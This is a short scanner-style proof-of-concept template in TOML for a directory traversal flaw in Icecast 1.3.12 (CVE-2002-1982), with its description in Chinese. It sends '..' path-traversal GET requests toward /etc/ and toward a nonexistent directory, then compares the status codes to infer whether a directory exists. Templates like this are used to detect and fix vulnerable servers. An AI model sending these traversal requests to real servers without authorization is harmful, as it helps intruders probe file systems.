[info]
author = "ave"
description = "通过向 Icecast 1.3.12 发送包含 .. 路径遍历的 GET 请求，探测服务器文件系统目录是否存在。当目标目录存在时返回正常响应，不存在时返回不同错误信息，通过差异比较可推断目录存在性。"
id = "POC-AVE-2002-0738"
name = "Icecast 1.3.12 Directory Traversal Information Disclosure PoC"
severity = "medium"
tags = ["ave-2002-0738"]
vuln_id = [
    "CVE-2002-1982",
    "AVE-2002-0738",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/file/../../../../../../../../etc/"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [
    403,
    400,
    404,
    200,
]
type = "status"

[[poc.requests]]
method = "GET"
path = "/file/../../../../../../../../nonexistent_dir_xyz/"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [
    403,
    400,
    404,
]
type = "status"
